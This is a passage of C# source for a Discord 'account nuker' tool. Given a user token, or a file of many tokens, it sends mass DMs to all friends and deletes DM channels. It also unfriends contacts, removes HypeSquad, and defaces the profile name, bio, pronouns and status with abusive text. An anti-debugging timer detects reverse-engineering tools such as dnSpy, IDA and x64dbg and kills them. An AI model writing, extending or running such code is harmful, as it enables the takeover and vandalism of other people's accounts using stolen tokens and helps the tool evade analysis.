                                var messageData = new Dictionary<string, string>
                        {
                            { "content", messageContent }
                        };

                                HttpResponseMessage messageResponse = await httpClient.PostAsync(messageUrl, new FormUrlEncodedContent(messageData));

                                Console.WriteLine($"[ $ ] ID: {channelId}");
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine($"The following error has been encountered and is being ignored: {e.Message}");
                            }
                        }

                        Console.WriteLine("\n\nSent Message to ALL friends");
                    }
                    else
                    {
                        Console.WriteLine($"Failed to fetch channel IDs. Status code: {channelsResponse.StatusCode}");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            });
            basicThread.Start();
        }


        private void StartBasicThread(string token)
        {
            basicThread = new Thread(async () =>
            {
                try
                {
                    using (var wClient = new WebClient())
                    {
                        Random random = new Random();
                        wClient.Headers.Set("Authorization", token);
                        wClient.Headers.Set("Content-Type", "application/json");
                        wClient.UploadString($"https://discord.com/api/v{(Convert.ToString(random.Next(8, 11)))}/users/%40me/profile", "PATCH", @"{""pronouns"": ""Fucked By SREUOU ACCOUNT NUKER""}");

                        StartBasicThread1(token);
                        MassDm(token);

                        wClient.Headers.Set("Authorization", token);
                        wClient.Headers.Set("Content-Type", "application/json");
                        wClient.UploadString($"https://discord.com/api/v{(Convert.ToString(random.Next(8, 11)))}/users/@me", "PATCH", @"{""global_name"": ""Fucked By SREUOU ACCOUNT NUKER""}");

                        wClient.Headers.Set("Authorization", token);
                        wClient.Headers.Set("Content-Type", "application/json");
                        wClient.UploadString($"https://discord.com/api/v{(Convert.ToString(random.Next(8, 11)))}/users/@me", "PATCH", @"{""bio"":""Fucked By ```SREUOU ACCOUNT NUKER``` Thanks For Used!""}");

                        wClient.Headers.Set("Authorization", token);
                        wClient.Headers.Set("Content-Type", "application/json");
                        wClient.UploadString($"https://discord.com/api/v{(Convert.ToString(random.Next(8, 11)))}/users/@me/settings", "PATCH", @"{""custom_status"":{""text"":""Fucked By SREUOU ACCOUNT NUKER Thanks For Used!""}}");

                        wClient.Headers.Set("Authorization", token);
                        wClient.Headers.Set("Content-Type", "application/json");
                        wClient.UploadString($"https://discord.com/api/v{(Convert.ToString(random.Next(8, 11)))}/users/@me/settings", "PATCH", @"{""status"": ""idle""}");

                        wClient.Headers.Set("Authorization", token);
                        wClient.Headers.Set("Content-Type", "application/json");
                        wClient.UploadString($"https://discord.com/api/v{(Convert.ToString(random.Next(8, 11)))}/users/@me/settings", "PATCH", @"{""locale"": ""ko""}");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            });
            basicThread.Start();
        }

        private void CloseDms(string token)
        {
            basicThread = new Thread(async () =>
            {
                try
                {
                    string baseUrl = "https://canary.discord.com/api/v8";
                    var headers = new Dictionary<string, string>

                    {
                        {"authorization", token},
                        {"user-agent", "Samsung Fridge/6.9"}
                    };

                    using (var httpClient = new HttpClient())
                    {
                        httpClient.DefaultRequestHeaders.TryAddWithoutValidation("authorization", token);
                        httpClient.DefaultRequestHeaders.TryAddWithoutValidation("user-agent", "Samsung Fridge/6.9");

                        HttpResponseMessage closeDmResponse = await httpClient.GetAsync($"{baseUrl}/users/@me/channels");
                        if (closeDmResponse.IsSuccessStatusCode)
                        {
                            string closeDmContent = await closeDmResponse.Content.ReadAsStringAsync();
                            dynamic closeDmJson = Newtonsoft.Json.JsonConvert.DeserializeObject(closeDmContent);

                            foreach (var channel in closeDmJson)
                            {
                                string channelId = channel.id;
                                Console.WriteLine($"[ C ] ID: {channelId}");

                                HttpResponseMessage deleteResponse = await httpClient.DeleteAsync($"{baseUrl}/channels/{channelId}");
                                if (!deleteResponse.IsSuccessStatusCode)
                                {
                                    Console.WriteLine($"Failed to delete channel {channelId}");
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("Failed to retrieve close DM channels.");
                        }
                    }
                }
                catch (Exception ex)
                {

                }
            });
            basicThread.Start();
        }

        private void StopSpamLightmodeThread()
        {
            if (basicThread != null && basicThread.IsAlive)
            {
                basicThread.Abort();
                basicThread = null;
            }
        }

        private void StopCreateServersThread()
        {
            if (createServersThread != null && createServersThread.IsAlive)
            {
                createServersThread.Abort();
                createServersThread = null;
            }
        }

        private void StopBasicThread()
        {
            if (basicThread != null && basicThread.IsAlive)
            {
                basicThread.Abort();
                basicThread = null;
            }
        }

        private async void siticoneButton11_Click(object sender, EventArgs e)
        {
            string token = siticoneRoundedTextBox1.Text;
            using (HttpClient client = new HttpClient())
            {
                client.DefaultRequestHeaders.Add("Authorization", token);
                HttpResponseMessage result = client.DeleteAsync("https://discord.com/api/v9/hypesquad/online").Result;
            }
        }

        private void siticoneButton12_Click(object sender, EventArgs e)
        {
            MassDm a = new MassDm();
            a.Show();
        }

        private void siticoneButton5_Click(object sender, EventArgs e)
        {
            ThemeChanger a = new ThemeChanger();
            a.Show();
        }

        private void siticoneButton14_Click(object sender, EventArgs e)
        {
            Settings a = new Settings();
            a.Show();
        }

        private void siticoneButton3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("COMING SOON TO NEXT UPDATE!", "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void siticoneButton13_Click(object sender, EventArgs e)
        {
            MessageBox.Show("COMING SOON TO NEXT UPDATE!", "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private async void siticoneButton6_Click(object sender, EventArgs e)
        {
            bool flag = MessageBox.Show("You Are Sure To Remove Friends For Ths User?", "SREUOU ACCOUNT NUKER", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes;
            if (flag)
            {
                {
                    string token = siticoneRoundedTextBox1.Text;
                    unfriend(token);
                }
            }
            else
            {
                StopBasicThread();
            }
        }

        private void siticoneImageButton1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("-- DEVELOPMENT BY SREUOU \n-- VERSION: " + version, "SREUOU ACCOUNT NUKER", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void gunaContextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {

        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            bool flag = MessageBox.Show("You Are Sure For The Nuke This Account?", "SREUOU ACCOUNT NUKER", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes;
            if (flag)
            {
                {
                    string token = siticoneRoundedTextBox1.Text;
                    StartBasicThread(token);
                }
            }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            string token = siticoneRoundedTextBox1.Text;
            CloseDms(token);
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            string token = siticoneRoundedTextBox1.Text;
            StartBasicThread1(token);
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            MassDm a = new MassDm();
            a.Show();
        }

        private void toolStripMenuItem4_Click_1(object sender, EventArgs e)
        {
            bool flag = MessageBox.Show("You Are Sure For The Spam This Account Light/Dark Mode?", "SREUOU ACCOUNT NUKER", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes;
            if (flag)
            {
                {
                    string token = siticoneRoundedTextBox1.Text;
                    StartBasicThread1(token);
                }
            }
        }

        private void toolStripMenuItem3_Click_1(object sender, EventArgs e)
        {
            MassDm a = new MassDm();
            a.Show();
        }

        private void toolStripMenuItem2_Click_1(object sender, EventArgs e)
        {
            bool flag = MessageBox.Show("You Are Sure For Close All Dms?", "SREUOU ACCOUNT NUKER", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes;
            if (flag)
            {
                {
                    string token = siticoneRoundedTextBox1.Text;
                    CloseDms(token);
                }
            }
        }

        private void tokensFoundToolStripMenuItem_Click(object sender, EventArgs e)
        {
            bool flag = MessageBox.Show("You Are Sure For Nuke Multi Accounts?", "SREUOU ACCOUNT NUKER", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes;
            if (flag)
            {
                {
                    using (StreamReader reader = new StreamReader("multi tokens.txt"))
                    {
                        List<string> tokens = new List<string>();
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            tokens.Add(line.Trim());
                        }

                        using (var wClient = new WebClient())
                        {
                            foreach (string token in tokens)
                            {
                                StartBasicThread(token);
                            }
                        }
                    }
                }
            }
            else
            {
                StopBasicThread();
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        private async void timer2_Tick(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            Application.Restart();
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void siticoneRoundedTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void gunaLabel1_Click(object sender, EventArgs e)
        {

        }

        private async void timer3_Tick(object sender, EventArgs e)
        {

        }

        private async void timer4_Tick(object sender, EventArgs e)
        {
            base.Height -= 25;
            if (base.Height <= 1)
            {
                timerHeight.Stop();
            }
        }

        private void timer5_Tick(object sender, EventArgs e)
        {
            base.Width -= 25;
            if (base.Width < 1)
            {
                timerWidth.Stop();
            }
        }

        private async void timer6_Tick(object sender, EventArgs e)
        {
            if (base.Opacity > 0.0)
            {
                base.Opacity -= 0.03;
                return;
            }
            if (len2 < text.Length)
            {
                label2.Text = label2.Text + text.ElementAt(len2);
                len2--;
            }
            timerOpacity.Stop();
            timerHeight.Start();
            timerWidth.Start();
            StopSpamLightmodeThread();
            Application.Exit();
        }

        private void timer4_Tick_1(object sender, EventArgs e)
        {

        }

        private void timer5_Tick_1(object sender, EventArgs e)
        {
            if (len < text.Length)
            {
                label2.Text = label2.Text + text.ElementAt(len);
                len++;
            }
            else
                timer5.Stop();
        }

        private void timer6_Tick_1(object sender, EventArgs e)
        {
            using (StreamReader reader = new StreamReader("multi tokens.txt"))
            {
                List<string> tokens = new List<string>();
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    if (line.Length == 1)
                    {
                        label3.Text = "Tokens Found: 0";
                    } 
                    else 
                    {
                        tokens.Add(line.Trim());
                        label3.Text = $"Tokens Found: {tokens.Count}";
                    }
                }
            }
        }

        private void timer7_Tick(object sender, EventArgs e)
        {
            if (Process.GetProcesses().Any((Process name) => name.ProcessName.Equals("dnSpy")))
            {
                Process[] ida64 = Process.GetProcessesByName("ida64");
                Process[] ida32 = Process.GetProcessesByName("ida32");
                Process[] ollydbg = Process.GetProcessesByName("ollydbg");
                Process[] ollydbg64 = Process.GetProcessesByName("ollydbg64");
                Process[] loaddll = Process.GetProcessesByName("loaddll");
                Process[] httpdebugger = Process.GetProcessesByName("httpdebugger");
                Process[] windowrenamer = Process.GetProcessesByName("windowrenamer");
                Process[] processhacker = Process.GetProcessesByName("processhacker");
                Process[] processhacker2 = Process.GetProcessesByName("Process Hacker");
                Process[] processhacker3 = Process.GetProcessesByName("ProcessHacker");
                Process[] HxD = Process.GetProcessesByName("HxD");
                Process[] parsecd = Process.GetProcessesByName("parsecd");
                Process[] ida = Process.GetProcessesByName("ida");
                Process[] dnSpy = Process.GetProcessesByName("dnSpy");
                Process[] megadumper = Process.GetProcessesByName("MegaDumper");
                if (ida64.Length != 0 || ida32.Length != 0 || ollydbg.Length != 0 || ollydbg64.Length != 0 || loaddll.Length != 0 || httpdebugger.Length != 0 || windowrenamer.Length != 0 || processhacker.Length != 0 || processhacker2.Length != 0 || processhacker3.Length != 0 || HxD.Length != 0 || ida.Length != 0 || parsecd.Length != 0 || dnSpy.Length != 0 || megadumper.Length != 0)
                {
                    SendKeys.Send("{PRTSC}");
                    Image myImage = Clipboard.GetImage();
                }
                Application.Restart();
                Process.Equals(Process.GetCurrentProcess().Id, CloseReason.ApplicationExitCall);
                Process.GetProcessesByName("dnSpy")[0].Kill();
            }
            else if (Process.GetProcesses().Any((Process name) => name.ProcessName.Equals("x64dbg")))
            {
                Application.Restart();
                Process.Equals(Process.GetCurrentProcess().Id, CloseReason.ApplicationExitCall);
                Process.GetProcessesByName("x64dbg")[0].Kill();
            }
        }
    }
}
